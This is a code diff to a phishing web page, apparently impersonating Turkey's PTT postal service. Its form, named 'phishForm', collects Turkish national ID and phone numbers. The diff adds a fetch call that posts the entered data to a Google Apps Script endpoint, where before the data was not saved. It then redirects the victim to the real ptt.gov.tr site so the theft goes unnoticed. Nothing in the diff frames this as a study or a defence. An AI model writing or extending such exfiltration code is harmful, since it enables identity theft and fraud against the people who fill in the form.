@@ -83,7 +83,9 @@
     <script>
         document.getElementById('phishForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            
+
+            const scriptURL = "https://script.google.com/macros/s/AKfycbxAxm2yDDored0GhPt9aS04dAV6svjjCgOOIjlMfoCVVRz-Nk1le-EQpsFUGoAfa1s/exec";
+
             const data = {
                 tc: document.getElementById('tc').value,
                 telefon: document.getElementById('telefon').value,
@@ -95,10 +97,17 @@
 
             alert("Bilgileriniz doğrulanıyor...");
 
-            // Geçici yönlendirme (şimdilik verileri kaydetmiyoruz)
-            setTimeout(() => {
+            fetch(scriptURL, {
+                method: 'POST',
+                body: JSON.stringify(data),
+                headers: { 'Content-Type': 'application/json' }
+            })
+            .then(() => {
                 window.location.href = "https://www.ptt.gov.tr";
-            }, 1200);
+            })
+            .catch(() => {
+                window.location.href = "https://www.ptt.gov.tr";
+            });
         });
     </script>
 </body>
